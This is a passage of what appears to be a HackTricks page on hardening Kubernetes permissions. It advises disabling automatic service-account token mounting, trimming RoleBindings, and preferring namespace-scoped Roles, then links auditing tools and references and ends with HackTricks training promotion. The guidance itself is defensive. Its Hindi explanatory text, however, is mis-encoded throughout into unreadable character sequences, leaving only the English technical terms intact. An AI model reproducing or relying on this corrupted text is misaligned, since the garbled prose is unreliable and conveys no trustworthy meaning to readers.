* **рдХреИрд╕реЗ рд▓рд╛рдЧреВ рдХрд░реЗрдВ**: service accounts рдпрд╛ pods рдХреА рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдореЗрдВ `automountServiceAccountToken: false` рд╕реЗрдЯ рдХрд░реЗрдВ, Kubernetes рд╕рдВрд╕реНрдХрд░рдг 1.6 рд╕реЗ рд╢реБрд░реВред

### **RoleBindings/ClusterRoleBindings рдореЗрдВ рдкреНрд░рддрд┐рдмрдВрдзрд╛рддреНрдордХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЕрд╕рд╛рдЗрдирдореЗрдВрдЯ**

* **рдЪрдпрдирд╛рддреНрдордХ рд╕рдорд╛рд╡реЗрд╢**: рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ рдХреЗрд╡рд▓ рдЖрд╡рд╢реНрдпрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ RoleBindings рдпрд╛ ClusterRoleBindings рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реИрдВред рдирд┐рдпрдорд┐рдд рд░реВрдк рд╕реЗ рдСрдбрд┐рдЯ рдХрд░реЗрдВ рдФрд░ рдЕрдкреНрд░рд╛рд╕рдВрдЧрд┐рдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рд╣рдЯрд╛рдПрдВ рддрд╛рдХрд┐ рд╕реБрд░рдХреНрд╖рд╛ рдордЬрдмреВрдд рдмрдиреА рд░рд╣реЗред

### **Namespace-рд╡рд┐рд╢рд┐рд╖реНрдЯ Roles рдкрд░ Cluster-Wide Roles**

* **Roles рдмрдирд╛рдо ClusterRoles**: ClusterRoles рдФрд░ ClusterRoleBindings рдХреЗ рдмрдЬрд╛рдп namespace-specific рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд▓рд┐рдП Roles рдФрд░ RoleBindings рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдкрд╕рдВрдж рдХрд░реЗрдВ, рдЬреЛ рдХреНрд▓рд╕реНрдЯрд░-рд╡реНрдпрд╛рдкреА рд▓рд╛рдЧреВ рд╣реЛрддреЗ рд╣реИрдВред рдпрд╣ рджреГрд╖реНрдЯрд┐рдХреЛрдг рдЕрдзрд┐рдХ рдирд┐рдпрдВрддреНрд░рдг рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рджрд╛рдпрд░реЗ рдХреЛ рд╕реАрдорд┐рдд рдХрд░рддрд╛ рд╣реИред

### **рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдЙрдкрдХрд░рдгреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ**

{% embed url="https://github.com/cyberark/KubiScan" %}

{% embed url="https://github.com/aquasecurity/kube-hunter" %}

{% embed url="https://github.com/aquasecurity/kube-bench" %}

## **References**

* [**https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions**](https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions)
* [**https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1**](https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1)
* [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
